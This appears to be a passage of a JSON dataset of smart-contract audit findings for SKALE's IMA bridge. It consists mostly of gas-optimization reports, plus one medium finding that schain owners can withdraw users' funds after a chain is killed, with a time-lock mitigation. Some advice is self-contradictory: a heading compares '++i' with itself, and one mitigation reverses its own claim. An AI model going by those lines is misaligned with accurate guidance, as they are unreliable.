ids.length; i++)       \n```\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/DepositBoxes/DepositBoxERC1155.sol#L444\n\n```solidity\nfor (uint256 i = 0; i < ids.length; i++)       \n```\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/DepositBoxes/DepositBoxERC1155.sol#L459\n\n```solidity\nfor (uint256 i = 0; i < tokens.length; i++) {      \n```\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/DepositBoxes/DepositBoxERC721.sol#L76\n\n```solidity\nfor (uint256 i = from; i < to; i++) {      \n```\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/DepositBoxes/DepositBoxERC721.sol#L260\n\n```solidity\nfor (uint i = 0; i < schainContracts.length; i++) {      \n```\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/Linker.sol#L100\n\n```solidity\nfor (uint i = 0; i < length; i++) {      \n```\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/Linker.sol#L149\n\n```solidity\nfor (uint i = 0; connected && i < length; i++) {    \n```\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/Linker.sol#L175\n\n```solidity\nfor (uint256 i = 0; i < contracts.length; i++) {      \n```\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/MessageProxyForMainnet.sol#L118\n\n```solidity\nfor (uint256 i = 0; i < messages.length; i++) {      \n```\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/MessageProxyForMainnet.sol#L235\n\n\n### `++i` costs less gas than `++i`, especially when it's used in for-loops (`--i`/`i--` too)\n```solidity\nfor (uint256 i = from; i < to; i++) {      \n```\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/MessageProxy.sol#L221\n\n```solidity\nfor (uint256 i = 0; i < messages.length; i++) {      \n```\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/MessageProxy.sol#L515\n\n```solidity\nfor (uint256 i = 0; i < tokens.length; i++) {      \n```\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/DepositBoxes/DepositBoxERC20.sol#L76\n\n```solidity\nfor (uint256 i = from; i < to; i++) {      \n```\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/DepositBoxes/DepositBoxERC20.sol#L276\n\n```solidity\nfor (uint256 i = 0; i < tokens.length; i++) {      \n```\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/DepositBoxes/DepositBoxERC1155.sol#L79\n\n```solidity\nfor (uint256 i = 0; i < ids.length; i++) {      \n```\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/DepositBoxes/DepositBoxERC1155.sol#L275\n\n```solidity\nfor (uint256 i = from; i < to; i++) {      \n```\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/DepositBoxes/DepositBoxERC1155.sol#L398\n\n```solidity\nfor (uint256 i = 0; i < ids.length; i++)       \n```\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/DepositBoxes/DepositBoxERC1155.sol#L444\n\n```solidity\nfor (uint256 i = 0; i < ids.length; i++)       \n```\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/DepositBoxes/DepositBoxERC1155.sol#L459\n\n```solidity\nfor (uint256 i = 0; i < tokens.length; i++) {      \n```\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/DepositBoxes/DepositBoxERC721.sol#L76\n\n```solidity\nfor (uint256 i = from; i < to; i++) {      \n```\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/DepositBoxes/DepositBoxERC721.sol#L260\n\n```solidity\nfor (uint i = 0; i < schainContracts.length; i++) {      \n```\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/Linker.sol#L100\n\n```solidity\nfor (uint i = 0; i < length; i++) {      \n```\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/Linker.sol#L149\n\n```solidity\nfor (uint i = 0; connected && i < length; i++) {    \n```\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/Linker.sol#L175\n\n```solidity\nfor (uint256 i = 0; i < contracts.length; i++) {      \n```\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/MessageProxyForMainnet.sol#L118\n\n```solidity\nfor (uint256 i = 0; i < messages.length; i++) {      \n```\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/MessageProxyForMainnet.sol#L235\n\n\n### It costs more gas to initialize variables to zero than to let the default of zero be applied\n```solidity\nfor (uint256 i = 0; i < messages.length; i++) {      \n```\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/MessageProxy.sol#L515\n\n```solidity\nfor (uint256 i = 0; i < tokens.length; i++) {      \n```\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/DepositBoxes/DepositBoxERC20.sol#L76\n\n```solidity\nfor (uint256 i = 0; i < tokens.length; i++) {      \n```\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/DepositBoxes/DepositBoxERC1155.sol#L79\n\n```solidity\nfor (uint256 i = 0; i < ids.length; i++) {      \n```\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/DepositBoxes/DepositBoxERC1155.sol#L275\n\n```solidity\nfor (uint256 i = 0; i < ids.length; i++)       \n```\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/DepositBoxes/DepositBoxERC1155.sol#L444\n\n```solidity\nfor (uint256 i = 0; i < ids.length; i++)       \n```\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/DepositBoxes/DepositBoxERC1155.sol#L459\n\n```solidity\nfor (uint256 i = 0; i < tokens.length; i++) {      \n```\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/DepositBoxes/DepositBoxERC721.sol#L76\n\n```solidity\nfor (uint i = 0; i < schainContracts.length; i++) {      \n```\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/Linker.sol#L100\n\n```solidity\nfor (uint i = 0; i < length; i++) {      \n```\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/Linker.sol#L149\n\n```solidity\nfor (uint i = 0; connected && i < length; i++) {    \n```\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/Linker.sol#L175\n\n```solidity\nfor (uint256 i = 0; i < contracts.length; i++) {      \n```\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/MessageProxyForMainnet.sol#L118\n\n```solidity\nuint notReimbursedGas = 0;            \n```\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/MessageProxyForMainnet.sol#L234\n\n```solidity\nfor (uint256 i = 0; i < messages.length; i++) {      \n```\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/MessageProxyForMainnet.sol#L235\n",
    "dataSource": {
      "name": "code-423n4/2022-02-skale-findings",
      "repo": "https://github.com/code-423n4/2022-02-skale-findings",
      "url": "https://github.com/code-423n4/2022-02-skale-findings/issues/74"
    }
  },
  {
    "title": "Schain owners can rug pull users' funds",
    "severity": "medium",
    "body": "# Lines of code\n\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/DepositBoxes/DepositBoxEth.sol#L138-L142\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/DepositBoxes/DepositBoxERC20.sol#L196-L200\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/DepositBoxes/DepositBoxERC721.sol#L183-L187\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/DepositBoxes/DepositBoxERC1155.sol#L261-L271\n\n\n# Vulnerability details\n\n## Impact\nOnce a chain has been killed the chain owner is able to call `getFunds()` on each of the deposit boxes and transfer funds/tokens wherever he/she wishes\n\nEven if the owner is benevolent the fact that there is a rug vector available may [negatively impact the protocol's reputation](https://twitter.com/RugDocIO/status/1411732108029181960). See [this](https://github.com/code-423n4/2021-08-realitycards-findings/issues/73) example where a similar finding has been flagged as a high-severity issue. I've downgraded these instances to be a medium since it requires cooperation of the IMA mainnet admin.\n\n## Proof of Concept\n```solidity\n    function getFunds(string calldata schainName, address payable receiver, uint amount)\n        external\n        override\n        onlySchainOwner(schainName)\n        whenKilled(keccak256(abi.encodePacked(schainName)))\n```\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/DepositBoxes/DepositBoxEth.sol#L138-L142\n\n```solidity\n    function getFunds(string calldata schainName, address erc20OnMainnet, address receiver, uint amount)\n        external\n        override\n        onlySchainOwner(schainName)\n        whenKilled(keccak256(abi.encodePacked(schainName)))\n```\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/DepositBoxes/DepositBoxERC20.sol#L196-L200\n\n```solidity\n    function getFunds(string calldata schainName, address erc721OnMainnet, address receiver, uint tokenId)\n        external\n        override\n        onlySchainOwner(schainName)\n        whenKilled(keccak256(abi.encodePacked(schainName)))\n```\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/DepositBoxes/DepositBoxERC721.sol#L183-L187\n\n```solidity\n    function getFunds(\n        string calldata schainName,\n        address erc1155OnMainnet,\n        address receiver,\n        uint256[] memory ids,\n        uint256[] memory amounts\n    )\n        external\n        override\n        onlySchainOwner(schainName)\n        whenKilled(keccak256(abi.encodePacked(schainName)))\n```\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/DepositBoxes/DepositBoxERC1155.sol#L261-L271\n\n## Tools Used\nCode inspection\n\n## Recommended Mitigation Steps\nAdd a long time lock for killing so users have plenty of time to get their funds out before a kill\n\n",
    "dataSource": {
      "name": "code-423n4/2022-02-skale-findings",
      "repo": "https://github.com/code-423n4/2022-02-skale-findings",
      "url": "https://github.com/code-423n4/2022-02-skale-findings/issues/71"
    }
  },
  {
    "title": "Gas Optimizations",
    "body": "## Gas Optimization\n\n### 1. Constant variables with keccak256 can be immutable\n\n#### Impact:\n\nConstant operation is being performed every time the variable is used, increasing the gas cost. Changing the variable to immutable will perform the operation once during deployment\n\n#### Proof of concept :\n\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/MessageProxy.sol#L50\n\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/CommunityPool.sol#L41\n\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/DepositBox.sol#L41\n\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/Twin.sol#L40\n\nReference : https://github.com/ethereum/solidity/issues/9232\n\n#### Mitigation:\n\nconstant variables can be changed to immutable \n\n### Prefix increment is cheaper than postfix increment\n\n#### Impact \n\npre increment ++i is more gas efficient than post increment i++ \n\n#### Proof of concept\n\nIn all contract that contains for loops\n\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/MessageProxy.sol#L221\n\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/MessageProxy.sol#L515\n\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/Linker.sol#L100\n\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/Linker.sol#L149\n\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/Linker.sol#L175\n\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/MessageProxyForMainnet.sol#L118\n\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/MessageProxyForMainnet.sol#L235\n\nSimilar finding: https://github.com/code-423n4/2022-01-livepeer-findings/issues/19\n\nMitigation:\n\nChange prefix increment to postfix increment\n\n### Initialising variables with default values\n\nVariables are initialised with default values during declaration costing extra gas\n\n#### Proof of concept\n\nSome for loops in the contract initialize uint i with its default value 0 \n\n```\n        for (uint256 i = 0; i < messages.length; i++) {\n\n```\n\n### Reorder require statements to save gas on revert\n\n#### Impact\n\nrequire statements can be re-ordered or placed above other statments to save gas cost on revert\n\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/extensions/ERC721ReferenceMintAndMetadataMainnet.sol#L74\n\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/DepositBoxes/DepositBoxERC1155.sol#L274\n\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/MessageProxyForMainnet.sol#L152\n\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/MessageProxyForMainnet.sol#L171\n\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/MessageProxyForMainnet.sol#L191\n\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/MessageProxyForMainnet.sol#L215-L218\n\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/Twin.sol#L66\n\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/Twin.sol#L84\n\n#### Mitigation\n\nreorder input validation statements in increasing gas costs\n\n### keccak operation can be replaced to save gas\n\nthe keccak256 operation can be replaced with final result to save gas\n\n#### Proof of concept\n\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/DepositBoxes/DepositBoxERC1155.sol#L333\n\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/DepositBoxes/DepositBoxERC1155.sol#L352\n\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/DepositBox.sol#L65\n\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/DepositBox.sol#L78\n\nkeccak operation can be cached to save gas : \n\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/DepositBoxes/DepositBoxERC721.sol#L256\n\n``` \n        require(\n            from < to && to - from <= 10 && to <= _schainToERC721[keccak256(abi.encodePacked(schainName))].length(),\n            \"Range is incorrect\"\n        );\n        tokensInRange = new address[](to - from);\n        for (uint256 i = from; i < to; i++) {\n            tokensInRange[i - from] = _schainToERC721[keccak256(abi.encodePacked(schainName))].at(i);\n        }\n```\n### revert string greater than 32 bytes\n\nSome revert string are longer than 32 bytes increasing gas cost in deployment and when the require condition is met\n\nReference: https://blog.polymath.network/solidity-tips-and-tricks-to-save-gas-and-reduce-bytecode-size-c44580b218e6#c17b\n\n```\n    modifier onlyExtraContractRegistrar() {\n        require(hasRole(EXTRA_CONTRACT_REGISTRAR_ROLE, msg.sender), \"EXTRA_CONTRACT_REGISTRAR_ROLE is required\");\n        _;\n    }\n```\n\n#### Proof of concept\n\nMost of the require statements in the contracts\n\nhttps://github.com/skalenetwork/ima-c4-audit/blob/main/contracts/MessageProxy.sol#L174\n\nhttps://github.com/skalenetwork/ima-c4-audit/blob/main/contracts/Messages.sol\n\nhttps://github.com/skalenetwork/ima-c4-audit/blob/main/contracts/mainnet/DepositBoxes/DepositBoxERC1155.sol\n\nhttps://github.com/skalenetwork/ima-c4-audit/blob/main/contracts/mainnet/DepositBoxes/DepositBoxERC20.sol\n\nhttps://github.com/skalenetwork/ima-c4-audit/blob/main/contracts/mainnet/DepositBoxes/DepositBoxERC721.sol\n\nhttps://github.com/skalenetwork/ima-c4-audit/blob/main/contracts/mainnet/DepositBoxes/DepositBoxEth.sol\n\nhttps://github.com/skalenetwork/ima-c4-audit/blob/main/contracts/mainnet/CommunityPool.sol\n\nhttps://github.com/skalenetwork/ima-c4-audit/blob/main/contracts/mainnet/MessageProxyForMainnet.sol\n\nhttps://github.com/skalenetwork/ima-c4-audit/blob/main/contracts/mainnet/Twin.sol\n\n#### Mitigation\n\nReduce revert string to under 32 bytes or use custom errors\n\n### Storage variables can be cached to prevent multiple reads\n\nStorage variables can be cached in a local variable can reused to prevent multiple reads from storage which consumes more gas\n\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/MessageProxy.sol#L145\n\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/MessageProxy.sol#L240\n\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/MessageProxy.sol#L258\n\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/MessageProxy.sol#L291-L296\n\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/MessageProxy.sol#L403\n\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/extensions/ERC721ReferenceMintAndMetadataMainnet.sol#L74-L84\n\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/extensions/ERC721ReferenceMintAndMetadataSchain.sol#L52-L59\n\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/DepositBoxes/DepositBoxEth.sol#L122\n\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/CommunityPool.sol#L98\n\n### Use unchecked to save gas\n\n#### Impact\nUnchecked can be used to bypass checks in operation where underflow/overflow cannot happen\n\n#### Proof of concept \n\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/MessageProxy.sol#L217\n\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/DepositBoxes/DepositBoxERC20.sol#L272\n\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/DepositBoxes/DepositBoxERC721.sol#L259\n\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/DepositBoxes/DepositBoxERC1155.sol#L397\n\n",
    "dataSource": {
      "name": "code-423n4/2022-02-skale-findings",
      "repo": "https://github.com/code-423n4/2022-02-skale-findings",
      "url": "https://github.com/code-423n4/2022-02-skale-findings/issues/65"
    }
  },
  {
    "title": "Gas Optimizations",
    "body": "**[S]**: Suggested optimation, save a decent amount of gas without compromising readability;\n\n**[M]**: Minor optimation, the amount of gas saved is minor, change when you see fit;\n\n**[N]**: Non-preferred, the amount of gas saved is at cost of readability, only apply when gas saving is a top priority.\n\n## [S] Cache storage variables in the stack can save gas\n\nFor the storage variables that will be accessed multiple times, cache them in the stack can save ~100 gas from each extra read (`SLOAD` after Berlin).\n\nFor example:\n\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/MessageProxyForMainnet.sol#L205-L253\n\n- `MessageProxyForMainnet.sol#postIncomingMessages()` `messages.length` can be cached as it will be read for more than 5 times;\n\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/MessageProxy.sol#L282-L303\n\n```solidity=282\n    function postOutgoingMessage(\n        bytes32 targetChainHash,\n        address targetContract,\n        bytes memory data\n    )\n        public\n        override\n        virtual\n    {\n        require(connectedChains[targetChainHash].inited, \"Destination chain is not initialized\");\n        _authorizeOutgoingMessageSender(targetChainHash);\n        \n        emit OutgoingMessage(\n            targetChainHash,\n            connectedChains[targetChainHash].outgoingMessageCounter,\n            msg.sender,\n            targetContract,\n            data\n        );\n\n        connectedChains[targetChainHash].outgoingMessageCounter += 1;\n    }\n```\n\n`connectedChains[targetChainHash].outgoingMessageCounter` at L296 can be cached to be reused at L302.\n\n## [S] Cache array length in for loops can save gas\n\nReading array length at each iteration of the loop takes 6 gas (3 for mload and 3 to place memory_offset) in the stack.\n\nCaching the array length in the stack saves around 3 gas per iteration.\n\nInstances include:\n\n- `MessageProxyForMainnet.sol#initializeAllRegisteredContracts()`\n\n    https://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/MessageProxyForMainnet.sol#L118-L126\n\n## [S] Remove redundant contains check for SE can save gas\n\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/DepositBoxes/DepositBoxERC20.sol#L77-L79\n\n```solidity=77\n        if (_deprecatedSchainToERC20[schainHash][tokens[i]] && !_schainToERC20[schainHash].contains(tokens[i])) {\n                _schainToERC20[schainHash].add(tokens[i]);\n                delete _deprecatedSchainToERC20[schainHash][tokens[i]];\n```\n\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/node_modules/@openzeppelin/contracts-upgradeable/utils/structs/EnumerableSetUpgradeable.sol#L53-L63\n\n```solidity=53\n    function _add(Set storage set, bytes32 value) private returns (bool) {\n        if (!_contains(set, value)) {\n            set._values.push(value);\n            // The value is stored at length-1, but we add 1 to all indexes\n            // and use 0 as a sentinel value\n            set._indexes[value] = set._values.length;\n            return true;\n        } else {\n            return false;\n        }\n    }\n```\n\nThe check of `!_schainToERC20[schainHash].contains(tokens[i])` is already included in function `add()`.\n\nTherefore, `!_schainToERC20[schainHash].contains(tokens[i])` is redundant.\n\nRemoving it will make the code simpler and save some gas.\n\n### Recommendation\n\n```solidity=77\n        if (_deprecatedSchainToERC20[schainHash][tokens[i]]) {\n                _schainToERC20[schainHash].add(tokens[i]);\n                delete _deprecatedSchainToERC20[schainHash][tokens[i]];\n```\n\nThe same issue also exists in:\n\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/DepositBoxes/DepositBoxERC20.sol#L76-L81\n\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/DepositBoxes/DepositBoxERC20.sol#L333-L344\n\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/DepositBoxes/DepositBoxERC20.sol#L367-L368\n\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/DepositBoxes/DepositBoxERC721.sol#L76-L81\n\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/schain/TokenManagers/TokenManagerERC20.sol#L249-L251\n\n\n## [M] Adding unchecked directive can save gas\n\nFor the arithmetic operations that will never over/underflow, using the unchecked directive (Solidity v0.8 has default overflow/underflow checks) can save some gas from the unnecessary internal over/underflow checks.\n\nFor example:\n\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/CommunityPool.sol#L98-L101\n\n```solidity=98\n        if (amount > _userWallets[user][schainHash]) {\n            amount = _userWallets[user][schainHash];\n        }\n        _userWallets[user][schainHash] = _userWallets[user][schainHash] - amount;\n```\n\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/CommunityPool.sol#L171-L173\n\n```solidity=171\n        require(amount <= _userWallets[msg.sender][schainHash], \"Balance is too low\");\n        require(!messageProxy.messageInProgress(), \"Message is in progress\");\n        _userWallets[msg.sender][schainHash] = _userWallets[msg.sender][schainHash] - amount;\n```\n\n`_userWallets[user][schainHash] - amount` will never underflow.\n\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/schain/MessageProxyForSchain.sol#L400-L404\n\n```solidity=400\n        if (address(etherbase).isContract()\n            && etherbase.hasRole(etherbase.ETHER_MANAGER_ROLE(), address(this)) \n            && balance < MINIMUM_BALANCE\n        ) {\n            uint missingAmount = MINIMUM_BALANCE - balance;\n```\n\n`MINIMUM_BALANCE - balance` will never underflow.\n\n## [M] Use short reason strings can save gas\n\nEvery reason string takes at least 32 bytes.\n\nUse short reason strings that fits in 32 bytes or it will become more expensive.\n\nInstances include:\n\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/MessageProxyForMainnet.sol#L220-L222\n\n```solidity=220\n        require(\n            startingCounter == connectedChains[fromSchainHash].incomingMessageCounter,\n            \"Starting counter is not equal to incoming message counter\");\n```\n\n\n## [M] `++i` is more efficient than `i++`\n\nUsing `++i` is more gas efficient than `i++`, especially in for loops.\n\nFor example:\n\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/MessageProxy.sol#L215-L224\n\n```solidity=215\n    {\n        require(\n            from < to && to - from <= 10 && to <= _getRegistryContracts()[schainHash].length(),\n            \"Range is incorrect\"\n        );\n        contractsInRange = new address[](to - from);\n        for (uint256 i = from; i < to; i++) {\n            contractsInRange[i - from] = _getRegistryContracts()[schainHash].at(i);\n        }\n    }\n```\n\nChange to:\n\n```solidity=215\n    {\n        require(\n            from < to && to - from <= 10 && to <= _getRegistryContracts()[schainHash].length(),\n            \"Range is incorrect\"\n        );\n        contractsInRange = new address[](to - from);\n        for (uint256 i = from; i < to; ++i) {\n            contractsInRange[i - from] = _getRegistryContracts()[schainHash].at(i);\n        }\n    }\n```\n\nOther examples:\n\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/MessageProxy.sol#L515-L522\n\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/MessageProxyForMainnet.sol#L118-L126\n\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/MessageProxyForMainnet.sol#L235-L250\n\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/Linker.sol#L149-L151\n\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/DepositBoxes/DepositBoxERC20.sol#L76-L81\n\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183791375e501915f/contracts/mainnet/DepositBoxes/DepositBoxERC721.sol#L260-L262\n\nhttps://github.com/skalenetwork/ima-c4-audit/blob/11d6a6ae5bf16af552edd75183